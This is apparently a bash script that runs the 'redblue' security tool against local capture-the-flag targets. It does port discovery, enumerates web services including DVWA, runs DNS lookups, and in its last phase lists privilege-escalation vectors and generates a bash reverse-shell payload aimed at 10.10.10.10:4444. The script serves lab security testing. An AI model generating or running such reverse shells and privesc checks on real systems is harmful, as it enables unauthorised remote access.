#!/bin/bash
# Comprehensive CTF Scan Script
# Scans all CTF targets and saves results to ctf-localhost.rdb

set -e

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

RB="./target/release/redblue"
TARGET="127.0.0.1"
SESSION_FILE="${TARGET}.rdb"

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_phase() {
    echo -e "\n${YELLOW}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW} $1${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════${NC}\n"
}

# Remove old session if exists
if [ -f "$SESSION_FILE" ]; then
    log_info "Removing old session file: $SESSION_FILE"
    rm "$SESSION_FILE"
fi

log_phase "🎯 Starting Comprehensive CTF Scan"
log_info "Target: $TARGET"
log_info "Session file: $SESSION_FILE"
echo ""

###########################################
# PHASE 1: Port Discovery
###########################################
log_phase "PHASE 1: Port Discovery"

log_info "Scanning common ports..."
$RB network ports scan $TARGET --preset common 2>&1 | head -50

log_info "Scanning CTF port range (20000-30000)..."
$RB network ports range $TARGET 20000 20100 2>&1 | head -50

log_success "Port discovery complete"

###########################################
# PHASE 2: Service Enumeration
###########################################
log_phase "PHASE 2: Service Enumeration"

# Web services
log_info "Testing DVWA (port 20888)..."
$RB web asset headers http://localhost:20888 2>&1 | head -30

log_info "Security audit DVWA..."
$RB web asset security http://localhost:20888 2>&1 | head -30

log_info "Testing Apache (port 20890)..."
$RB web asset get http://localhost:20890 2>&1 | head -30

log_info "Testing Nginx (port 20891)..."
$RB web asset get http://localhost:20891 2>&1 | head -30

log_success "Service enumeration complete"

###########################################
# PHASE 3: DNS Reconnaissance
###########################################
log_phase "PHASE 3: DNS Reconnaissance"

log_info "DNS lookup for localhost..."
$RB dns record resolve localhost 2>&1 | head -20

log_info "DNS lookup for google.com (connectivity test)..."
$RB dns record lookup google.com --type A 2>&1 | head -20

log_success "DNS reconnaissance complete"

###########################################
# PHASE 4: Exploitation Assessment
###########################################
log_phase "PHASE 4: Exploitation Assessment"

log_info "Checking for privilege escalation vectors..."
$RB exploit payload privesc 2>&1 | head -50

log_info "Generating sample bash reverse shell..."
$RB exploit payload shell --type bash --lhost 10.10.10.10 --lport 4444 2>&1 | head -30

log_success "Exploitation assessment complete"

###########################################
# SUMMARY
###########################################
log_phase "📊 Scan Complete!"

log_success "All phases completed successfully"
log_info "Session file: $SESSION_FILE"
echo ""
log_info "To explore results interactively:"
echo -e "  ${BLUE}$RB repl $SESSION_FILE${NC}"
echo ""
log_info "To list discovered hosts:"
echo -e "  ${BLUE}$RB network hosts list${NC}"
echo ""
log_info "To list open ports:"
echo -e "  ${BLUE}$RB network ports list${NC}"
echo ""
